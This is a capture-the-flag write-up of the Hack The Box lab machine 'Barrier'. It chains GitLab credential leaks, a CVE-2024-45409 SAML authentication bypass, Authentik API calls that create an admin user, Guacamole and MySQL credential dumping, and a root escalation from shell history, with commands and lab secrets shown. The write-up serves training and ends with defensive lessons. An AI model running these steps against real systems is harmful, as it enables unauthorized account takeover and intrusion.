# Barrier

Barrier is a medium-rated Linux Hack The Box machine involving multiple web services, GitLab, Authentik, SAML authentication, API abuse, Apache Guacamole, credential discovery, and SSH-based privilege escalation.

**Target IP:** `10.129.234.46`

---

## Overview

The initial enumeration revealed several exposed services, including SSH, HTTP, HTTPS, Apache Tomcat, and an Authentik web application.

The attack began by enumerating the GitLab instance exposed through HTTPS. A publicly accessible repository belonging to the `satoru` user contained credentials that allowed authentication to GitLab.

After identifying the GitLab version, the environment was further enumerated and another user, `akadmin`, was discovered.

The same credentials were reused against the Authentik service. From there, the attack path involved exploiting **CVE-2024-45409**, a SAML authentication bypass affecting Ruby-SAML and OmniAuth-SAML.

This provided access to the Authentik administrator account. An API token found in the CI/CD variables was then used against the Authentik API to create a new user and grant it administrator privileges.

The new account was subsequently used with the Guacamole service, leading to access as the `maki` user. From there, Guacamole configuration files and the MySQL database exposed SSH credentials and an encrypted private key.

Finally, access as `maki_adm` was obtained, and credentials found in `.bash_history` allowed escalation to `root`.

---

# Enumeration

## Nmap Scan

We started with a standard Nmap scan:

```bash
nmap 10.129.234.46
```

The scan revealed:

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
9000/tcp open  cslistener
```

An all-port scan was also running in the background.

---

## Service and Version Detection

Next, service and version detection was performed:

```bash
nmap -sC -sV 10.129.234.46
```

Important results included:

| Port | Service | Version / Information        |
| ---- | ------- | ---------------------------- |
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu         |
| 80   | HTTP    | nginx                        |
| 443  | HTTPS   | nginx / GitLab               |
| 8080 | HTTP    | Apache Tomcat                |
| 9000 | HTTP    | Golang `net/http`, Authentik |

Port `80` redirected to:

```text
https://gitlab.barrier.vl/
```

The HTTPS certificate also identified:

```text
gitlab.barrier.vl
```

Port `9000` was identified as an **Authentik** installation.

---

# Web Enumeration

## GitLab

Since Nmap identified `gitlab.barrier.vl`, it was added to the local hosts file.

The HTTP service redirected to the HTTPS GitLab instance.

After accessing the GitLab sign-in page, the **Explore** functionality was examined.

A publicly accessible repository belonging to the `satoru` user was discovered.

Further enumeration of the repository revealed authentication information:

```python
auth_data = {
    'grant_type': 'password',
    'username': 'satoru',
    'password': 'dGJ2V72SUEMsM3Ca'
}
```

The discovered credentials were:

```text
Username: satoru
Password: dGJ2V72SUEMsM3Ca
```

These credentials allowed us to authenticate to GitLab as `satoru`.

---

# GitLab Enumeration

After logging in as `satoru`, the GitLab version was checked.

The instance was running:

```text
GitLab Community Edition v17.3.2
```

Further enumeration of the GitLab environment led to the project members page:

```text
https://gitlab.barrier.vl/satoru/gitconnect/-/project_members
```

Another user named:

```text
akadmin
```

was discovered.

At this point, the GitLab environment had provided both additional user information and access to the authentication infrastructure.

---

# Authentik Enumeration

Port `9000` was identified as an Authentik service.

The previously discovered GitLab password was reused against the Authentik login interface.

The credentials were accepted, providing access to the Authentik dashboard.

Further enumeration also revealed that another service, Guacamole, was present on the system.

However, valid credentials were still required for Guacamole.

---

# Initial Access to Authentik Administrator

## CVE-2024-45409

The next step involved the SAML authentication mechanism between Authentik and GitLab.

The relevant vulnerability was:

```text
CVE-2024-45409
```

This vulnerability affects Ruby-SAML and OmniAuth-SAML and involves improper verification of digital signatures in SAML assertions.

The exploit used in this process was:

```text
https://github.com/synacktiv/CVE-2024-45409.git
```

The GitLab SAML authentication flow was intercepted and the SAML response was saved as:

```text
saml.xml
```

The SAML response was decoded using:

```text
URL Decode
Base64
Raw Inflate
```

This exposed the SAML XML structure and assertion.

---

## Generating the Malicious SAML Response

The exploit was executed against the captured SAML response:

```bash
python3 CVE-2024-45409.py -r saml.xml -n akadmin -e -o response.xml
```

The exploit output showed several modifications being made:

```text
[+] Parse response
    Digest algorithm: sha256
    Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#

[+] Remove signature from response
[+] Patch assertion ID
[+] Patch assertion NameID
[+] Patch assertion conditions
[+] Move signature in assertion
[+] Patch response ID
[+] Insert malicious reference
[+] Clone signature reference
[+] Create status detail element
[+] Patch digest value
[+] Write patched file in response.xml
```

The resulting `response.xml` was then placed back into the intercepted SAML request.

This resulted in authentication as:

```text
akadmin
```

---

# Authentik Administrator Access

After the modified SAML response was submitted, the GitLab session was established as `akadmin`.

The Authentik administrator account was confirmed to be a superuser during API enumeration.

The next step was to investigate the Authentik administrator functionality and CI/CD configuration.

---

# API Token Discovery

Within the CI/CD settings, variables containing sensitive information were discovered.

One of the exposed values was an API key:

```text
MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc
```

This token could be used against the Authentik API.

A request to enumerate users was performed:

```bash
curl -L http://barrier.vl:9000/api/v3/core/users/ \
  -H "Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc" | jq
```

The API returned information about several users, including:

```text
akadmin
maki
satoru
```

The `akadmin` account was shown as:

```text
"is_superuser": true
```

---

# Creating a New Authentik User

Using the discovered API token, a new user named `brandy` was created:

```bash
curl -k -X POST http://barrier.vl:9000/api/v3/core/users/ \
  -H "Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "brandy",
    "name": "brandy",
    "email": "brandy@barrier.vl"
  }'
```

The API returned:

```text
"pk":36
"username":"brandy"
"name":"brandy"
"is_active":true
```

---

## Setting the Password

A password was assigned to the newly created account:

```bash
curl -L 'http://barrier.vl:9000/api/v3/core/users/36/set_password/' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' \
  -d '{"password":"1234"}'
```

---

## Adding the User to the Administrator Group

The newly created user was then added to the Authentik administrator group:

```bash
curl -L 'http://barrier.vl:9000/api/v3/core/groups/a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8/add_user/' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' \
  -d '{"pk":36}'
```

The `brandy` account could now be used with administrator-level Authentik access.

---

# Guacamole Access

Further enumeration of the services revealed a Guacamole interface.

After logging in using the newly created account, other available users were visible, including:

```text
maki
```

The `maki` account could be impersonated through the available Guacamole functionality.

This provided access to a shell as:

```text
maki@barrier
```

---

# User Access

After obtaining the shell as `maki`, the home directory was enumerated:

```bash
maki@barrier:~$ ls
```

Output:

```text
user.txt
```

The user flag was retrieved:

```bash
cat user.txt
```

At this stage, we had obtained user-level access.

---

# Credential Discovery

## Guacamole Configuration

The Guacamole configuration was inspected:

```bash
cat /etc/guacamole/guacamole.properties
```

The configuration contained MySQL connection information:

```text
mysql-hostname: 127.0.0.1
mysql-port: 3306
mysql-database: guac_db
mysql-username: guac_user
mysql-password: guac2024
```

The discovered database credentials were used to connect to the Guacamole database:

```bash
mysql -u guac_user -pguac2024 guac_db
```

---

# Guacamole Database Enumeration

The database was queried for connection parameters:

```sql
select * from guacamole_connection_parameter where connection_id=2 \G
```

Important values included:

```text
connection_id: 2
parameter_name: hostname
parameter_value: localhost
```

```text
parameter_name: passphrase
parameter_value: 3V32FN6oViMPxyzC
```

```text
parameter_name: port
parameter_value: 22
```

The database also contained an encrypted private SSH key:

```text
parameter_name: private-key
parameter_value: -----BEGIN RSA PRIVATE KEY-----
```

The username associated with the connection was:

```text
maki_adm
```

The relevant database information was therefore:

| Parameter      | Value                     |
| -------------- | ------------------------- |
| Host           | `localhost`               |
| Port           | `22`                      |
| Username       | `maki_adm`                |
| Passphrase     | `3V32FN6oViMPxyzC`        |
| Authentication | Encrypted RSA private key |

---

# SSH Access

The private key was saved locally and appropriate permissions were applied:

```bash
chmod 600 id_ed25519
```

Because of the older SSH configuration, the RSA host key algorithm was explicitly enabled:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -i id_ed25519 maki@barrier.vl
```

This provided SSH access to the system.

The discovered Guacamole credentials also provided information for the `maki_adm` account.

---

# Privilege Escalation

## Access as `maki_adm`

After obtaining the required key material and passphrase, access to the `maki_adm` account was established.

The next step was checking the user's shell history:

```bash
cat .bash_history
```

The history contained:

```text
sudo su
Va4kSjgTHSd55ZLv
```

This revealed a password associated with the `sudo su` command.

---

# Root Access

Using the discovered password, `sudo su` was executed:

```bash
sudo su
```

The password was entered when prompted:

```text
[sudo] password for maki_adm:
```

This resulted in a root shell:

```text
root@barrier:/home/maki_adm#
```

The root flag was then retrieved:

```bash
cat /root/root.txt
```

---

# Attack Path Summary

The complete attack chain was:

```text
Nmap Enumeration
        |
        v
GitLab / Authentik / Guacamole Discovery
        |
        v
GitLab Public Repository
        |
        v
Satoru Credentials
        |
        v
GitLab Access
        |
        v
akadmin Discovery
        |
        v
CVE-2024-45409
SAML Authentication Bypass
        |
        v
Authentik Administrator
        |
        v
CI/CD API Token
        |
        v
Authentik API
        |
        v
Create "brandy"
        |
        v
Add brandy to Admin Group
        |
        v
Guacamole
        |
        v
Impersonate maki
        |
        v
maki Shell
        |
        v
Guacamole Configuration
        |
        v
MySQL Credentials
        |
        v
Guacamole Database
        |
        v
maki_adm SSH Key + Passphrase
        |
        v
maki_adm
        |
        v
.bash_history
        |
        v
sudo su
        |
        v
ROOT
```

---

# Key Takeaways

* Multiple exposed services significantly expanded the attack surface.
* Public GitLab repositories should never contain authentication secrets.
* Credential reuse between services can turn a low-privileged account into a much more valuable foothold.
* SAML authentication requires careful signature validation.
* CI/CD variables can become a critical source of secrets if improperly protected.
* Authentik API access can provide extensive control over users and groups.
* Guacamole configurations and databases may contain highly sensitive authentication material.
* Private SSH keys and passphrases must be protected as credentials.
* Shell history can expose previously used privileged credentials.
* A successful attack may involve chaining several individually manageable weaknesses rather than relying on a single vulnerability.

---

# Tools Used

| Tool                   | Purpose                              |
| ---------------------- | ------------------------------------ |
| Nmap                   | Port and service enumeration         |
| GitLab                 | Repository and user enumeration      |
| Authentik              | Authentication infrastructure        |
| Burp Suite / Proxy     | SAML request interception            |
| CyberChef              | SAML response decoding               |
| CVE-2024-45409 exploit | SAML authentication bypass           |
| curl                   | Authentik API interaction            |
| ffuf                   | Web directory enumeration            |
| Guacamole              | Remote shell access                  |
| MySQL                  | Database enumeration                 |
| SSH                    | Remote access                        |
| Linux shell            | Enumeration and privilege escalation |

---

# Conclusion

Barrier was a multi-stage Linux machine that required chaining several services together rather than relying on a single direct exploit.

The attack started with GitLab enumeration and exposed credentials, progressed through Authentik and a SAML authentication bypass, and then leveraged an Authentik API token to gain administrative control.

From there, Guacamole provided a path to the `maki` account. Sensitive configuration and database information then exposed the material required to move to `maki_adm`.

Finally, credentials recovered from shell history allowed `sudo su` to provide root access.

**Attack Path:** GitLab Enumeration → Credential Discovery → Authentik → SAML Bypass → API Abuse → Guacamole → Maki → Database Enumeration → SSH Key → `maki_adm` → `sudo su` → Root
